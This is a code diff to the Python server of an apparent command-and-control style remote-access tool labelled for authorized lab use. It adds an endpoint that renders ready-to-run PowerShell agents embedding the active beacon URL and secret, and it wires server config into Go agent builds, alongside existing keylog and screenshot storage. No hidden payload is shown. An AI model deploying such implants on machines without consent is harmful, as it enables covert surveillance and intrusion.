@@ -104,6 +104,7 @@ CLIENT_SCRIPT = os.path.join(
 )
 GO_AGENT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent-go")
 GO_AGENT_BUILD_DIR = os.path.join(LOG_DIR, "agent-builds")
+AGENT_DEPLOY_DIR = os.path.join(LOG_DIR, "agent-deploy")
 # Operator PE and script plugins served to the agent. Deploy release artifacts
 # here from the external Minimal-RMM-plugins repository.
 PLUGINS_DIR = settings_getenv("RMM_PLUGINS_DIR", "").strip() or os.path.join(LOG_DIR, "plugins")
@@ -465,6 +466,54 @@ def validate_agent_connection(agent_config, public_url):
         raise ValueError("The selected Quick Tunnel URL is stale. Refresh transport status and use the current beacon URL before building.")
 
 
+def render_configured_client_script(
+    template: str,
+    base_url: str,
+    beacon_secret: str,
+    session_id: str = "",
+    sleep_seconds: int = 60,
+    jitter_percent: int = 30,
+    http_proxy: str = "",
+) -> str:
+    """Render a ready-to-run client_rmm.ps1 with an explicit connection config."""
+    url = str(base_url or "").strip().rstrip("/")
+    secret = str(beacon_secret or "").strip()
+    if not url or not secret:
+        raise ValueError("Server URL and beacon secret are required")
+    for label, value in (("URL", url), ("secret", secret), ("proxy", str(http_proxy or "").strip())):
+        if "\r" in value or "\n" in value:
+            raise ValueError(f"invalid agent {label}")
+    if not isinstance(sleep_seconds, int) or not 1 <= sleep_seconds <= 3600:
+        raise ValueError("Beacon sleep is outside the allowed range")
+    if not isinstance(jitter_percent, int) or not 0 <= jitter_percent <= 100:
+        raise ValueError("Beacon jitter is outside the allowed range")
+
+    def ps_quote(value: str) -> str:
+        return "'" + value.replace("'", "''") + "'"
+
+    replacements = {
+        "$u = 'REPLACE-WITH-YOUR-CLOUDFLARED-URL'\n": "$u = " + ps_quote(url) + "\n",
+        "$beaconSecret = ''\n": "$beaconSecret = " + ps_quote(secret) + "\n",
+    }
+    if session_id:
+        if not validate_beacon_session_id(session_id):
+            raise ValueError("invalid session id")
+        replacements["$sessionId = [System.Guid]::NewGuid().ToString()\n"] = "$sessionId = " + ps_quote(session_id) + "\n"
+    if sleep_seconds != 60:
+        replacements["$baseSleepSeconds = 60\n"] = f"$baseSleepSeconds = {sleep_seconds}\n"
+    if jitter_percent != 30:
+        replacements["$jitterPercent = 30\n"] = f"$jitterPercent = {jitter_percent}\n"
+    proxy = str(http_proxy or "").strip()
+    if proxy:
+        replacements["$httpProxy = ''\n"] = "$httpProxy = " + ps_quote(proxy) + "\n"
+    rendered = template
+    for placeholder, value in replacements.items():
+        if rendered.count(placeholder) != 1:
+            raise ValueError("Agent script template changed; cannot patch configuration")
+        rendered = rendered.replace(placeholder, value)
+    return rendered
+
+
 def build_go_agent(goos: str, goarch: str, agent_config: dict | None = None, process_owner=None) -> dict:
     """Build a fixed repository Go agent for one allowlisted OS and architecture."""
     goos = str(goos or "").strip().lower()
@@ -495,8 +544,9 @@ def build_go_agent(goos: str, goarch: str, agent_config: dict | None = None, pro
         raise ValueError("Go beacon timing is outside the allowed range")
     suffix = ".exe" if goos == "windows" else ""
     binary_filename = f"minimal-rmm-agent-{goos}-{goarch}{suffix}"
-    binary_path = safe_join_under(GO_AGENT_BUILD_DIR, binary_filename)
-    filename = f"minimal-rmm-agent-{goos}-{goarch}.zip"
+    build_id = secrets.token_hex(16)
+    binary_path = safe_join_under(GO_AGENT_BUILD_DIR, f"{build_id}-{binary_filename}")
+    filename = f"minimal-rmm-agent-{goos}-{goarch}-{build_id}.zip"
     output_path = safe_join_under(GO_AGENT_BUILD_DIR, filename)
     go_cache = safe_join_under(LOG_DIR, "go-cache")
     os.makedirs(go_cache, exist_ok=True)
@@ -631,6 +681,8 @@ Authorized lab use only.
         "goarch": goarch,
         "sha256": digest.hexdigest(),
         "size": os.path.getsize(output_path),
+        "path": output_path,
+        "artifact_ref": f"artifact:agent-builds/{filename}",
         "download_url": f"{API_PREFIX}/artifacts/agent-builds/{filename}",
     }
 
@@ -666,6 +718,7 @@ os.makedirs(os.path.join(LOG_DIR, "downloads"), exist_ok=True)
 os.makedirs(os.path.join(LOG_DIR, "screenshots"), exist_ok=True)
 os.makedirs(os.path.join(LOG_DIR, "keylogs"), exist_ok=True)
 os.makedirs(GO_AGENT_BUILD_DIR, exist_ok=True)
+os.makedirs(AGENT_DEPLOY_DIR, exist_ok=True)
 os.makedirs(HISTORY_DIR, exist_ok=True)
 
 # ANSI Colors
@@ -3299,7 +3352,7 @@ class RMMHandler(BaseHTTPRequestHandler):
         return True
 
     def _serve_artifact(self, kind: str, filename: str, qs=None):
-        if kind not in ("downloads", "screenshots", "agent-builds"):
+        if kind not in ("downloads", "screenshots", "agent-builds", "agent-deploy"):
             self._json(404, {"error": "not_found"})
             return True
         safe = safe_storage_filename(filename, "")
@@ -3825,7 +3878,7 @@ class RMMHandler(BaseHTTPRequestHandler):
             return True
 
         if len(parts) == 3 and parts[0] == "artifacts":
-            if workspace_id and parts[1] != "agent-builds":
+            if workspace_id and parts[1] not in {"agent-builds", "agent-deploy"}:
                 self._json(404, {"error": "not_found"})
                 return True
             return self._serve_artifact(parts[1], parts[2], qs)
@@ -4003,9 +4056,91 @@ class RMMHandler(BaseHTTPRequestHandler):
             self._json(201, {"ok": True, "asset": row, "workspace_local": False})
             return True
 
-        if parts == ["agent", "go", "build"]:
+        if parts == ["agent", "deploy", "script"]:
+            public_url = str(srv.beacon_public_url or "").strip()
+            if not public_url:
+                self._json(409, {"error": "no_active_beacon_url", "detail": "Start or configure a beacon transport profile first."})
+                return True
+            if not BEACON_SECRET:
+                self._json(503, {"error": "no_beacon_secret", "detail": "Server has no active RMM_BEACON_SECRET."})
+                return True
+            session_id = str(body.get("session_id") or "").strip()
             try:
-                validate_agent_connection(body.get("config"), srv.beacon_public_url)
+                sleep_seconds = int(body.get("sleep_seconds", 60))
+                jitter_percent = int(body.get("jitter_percent", 30))
+            except (TypeError, ValueError):
+                self._json(400, {"error": "invalid_timing"})
+                return True
+            if not 1 <= sleep_seconds <= 3600 or not 0 <= jitter_percent <= 100:
+                self._json(400, {"error": "invalid_timing"})
+                return True
+            http_proxy = str(body.get("http_proxy") or "").strip()
+            script_path = os.path.realpath(CLIENT_SCRIPT)
+            repo_root = os.path.realpath(os.path.dirname(os.path.abspath(__file__)))
+            if not script_path.startswith(repo_root + os.sep):
+                self._json(500, {"error": "invalid_script_path"})
+                return True
+            try:
+                with open(script_path, encoding="utf-8") as handle:
+                    template = handle.read()
+            except OSError as exc:
+                self._json(500, {"error": "script_unavailable", "detail": str(exc)})
+                return True
+            try:
+                content = render_configured_client_script(
+                    template,
+                    public_url,
+                    BEACON_SECRET,
+                    session_id=session_id,
+                    sleep_seconds=sleep_seconds,
+                    jitter_percent=jitter_percent,
+                    http_proxy=http_proxy,
+                )
+            except ValueError as exc:
+                self._json(400, {"error": "invalid_agent_config", "detail": str(exc)})
+                return True
+            filename = f"client_rmm-{time.strftime('%Y%m%d-%H%M%S')}-{secrets.token_hex(3)}.ps1"
+            output_path = safe_join_under(AGENT_DEPLOY_DIR, filename)
+            with open(output_path, "w", encoding="utf-8", newline="\n") as handle:
+                handle.write(content)
+            digest = hashlib.sha256()
+            with open(output_path, "rb") as handle:
+                for chunk in iter(lambda: handle.read(1024 * 1024), b""):
+                    digest.update(chunk)
+            self._json(200, {
+                "ok": True,
+                "filename": filename,
+                "path": output_path,
+                "artifact_ref": f"artifact:agent-deploy/{filename}",
+                "size": os.path.getsize(output_path),
+                "sha256": digest.hexdigest(),
+                "base_url": public_url,
+                "session_id": session_id or None,
+                "download_url": f"{API_PREFIX}/artifacts/agent-deploy/{filename}",
+                "note": "Server-local artifact configured with the active beacon URL and secret; the secret is not returned.",
+            })
+            return True
+
+        if parts == ["agent", "go", "build"]:
+            config = body.get("config", {})
+            if not isinstance(config, dict):
+                self._json(400, {"error": "invalid_agent_config", "detail": "config must be a JSON object"})
+                return True
+            config = dict(config)
+            if body.get("use_server_config"):
+                if not str(config.get("base_url") or "").strip():
+                    public_url = str(srv.beacon_public_url or "").strip()
+                    if not public_url:
+                        self._json(409, {"error": "no_active_beacon_url", "detail": "Start or configure a beacon transport profile first."})
+                        return True
+                    config["base_url"] = public_url
+                if not str(config.get("beacon_secret") or "").strip():
+                    if not BEACON_SECRET:
+                        self._json(503, {"error": "no_beacon_secret", "detail": "Server has no active RMM_BEACON_SECRET."})
+                        return True
+                    config["beacon_secret"] = BEACON_SECRET
+            try:
+                validate_agent_connection(config, srv.beacon_public_url)
             except ValueError as exc:
                 self._json(400, {"error": "invalid_agent_connection", "detail": str(exc)})
                 return True
@@ -4013,7 +4148,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                 result = build_go_agent(
                     body.get("goos"),
                     body.get("goarch"),
-                    agent_config=body.get("config"),
+                    agent_config=config,
                     process_owner=srv.builds,
                 )
             except ValueError as exc:
